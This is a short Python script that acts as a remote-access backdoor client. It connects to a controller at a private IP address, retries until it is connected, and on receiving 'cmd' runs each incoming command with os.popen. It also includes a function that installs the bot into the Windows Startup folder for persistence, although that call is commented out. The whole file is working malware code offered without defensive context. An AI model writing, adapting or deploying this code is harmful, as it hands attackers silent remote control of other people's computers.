import socket
import threading
import os
import time
import getpass

USER_NAME = getpass.getuser()
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)

path = os.getcwd()
#add_to_startup(str(path + r'\bot\bot.exe'))




client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect():
	try:
		client.connect(('192.168.1.110', 50016))
	except:
		time.sleep(30)
		connect()

connect()







def recive():

	cmdmode = False
	while True:
		command = client.recv(1024).decode('ascii')
		
		if command == 'cmd':
			cmdmode = True
			client.send('You now have terminal access'.encode('ascii'))
		elif command == '^C':
			cmdmode = False
			client.send('Exiting terminal'.encode('ascii'))
		elif cmdmode:
			os.popen(command)
		else:
			print(command)

recive()
